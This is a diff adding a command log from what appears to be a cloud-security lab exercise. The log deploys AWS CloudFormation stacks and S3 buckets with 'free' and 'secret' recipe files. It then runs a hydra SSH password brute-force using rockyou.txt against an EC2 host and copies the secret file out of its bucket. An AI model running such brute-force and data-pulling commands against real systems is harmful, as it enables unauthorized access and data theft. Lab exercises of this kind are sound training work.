@@ -1,0 +1,36 @@
+$ aws cloudformation create-stack --region us-east-1 --stack-name c3-s3 --template-body file://starter/c3-s3.yml
+
+{
+    "StackId": "arn:aws:cloudformation:us-east-1:381613870484:stack/c3-s3/8aeca520-6fd0-11ef-b9a5-0affc9377d4d"
+}
+
+$ aws cloudformation create-stack --region us-east-1 --stack-name c3-vpc --template-body file://starter/c3-vpc.yml
+
+{
+    "StackId": "arn:aws:cloudformation:us-east-1:381613870484:stack/c3-vpc/9e550f30-6fd0-11ef-bcff-0affcd87e38f"
+}
+
+$ aws cloudformation create-stack --region us-east-1 --stack-name c3-app --template-body file://starter/c3-app.yml --parameters ParameterKey=KeyPair,ParameterValue=hungnv-dev --capabilities CAPABILITY_IAM
+
+{
+    "StackId": "arn:aws:cloudformation:us-east-1:381613870484:stack/c3-app/d19ef130-6fd0-11ef-815d-0affe0afb355"
+}
+
+BucketNameRecipesFree       cand-c3-free-recipes-381613870484
+BucketNameRecipesSecret     cand-c3-secret-recipes-381613870484
+
+$ aws s3 cp starter/free_recipe.txt s3://cand-c3-free-recipes-381613870484/ --region us-east-1
+$ aws s3 cp starter/secret_recipe.txt s3://cand-c3-secret-recipes-381613870484/ --region us-east-1
+
+$ ssh -i ....
+$ date
+$ hydra -l ubuntu -P rockyou.txt ssh://ec2-44-218-66-164.compute-1.amazonaws.com
+
+# view the files in the secret recipes bucket
+$ aws s3 ls s3://cand-c3-secret-recipes-381613870484/ --region us-east-1
+ 
+# download the files
+$ aws s3 cp s3://cand-c3-secret-recipes-381613870484/secret_recipe.txt  .  --region us-east-1
+
+# view contents of the file
+$ cat secret_recipe.txt
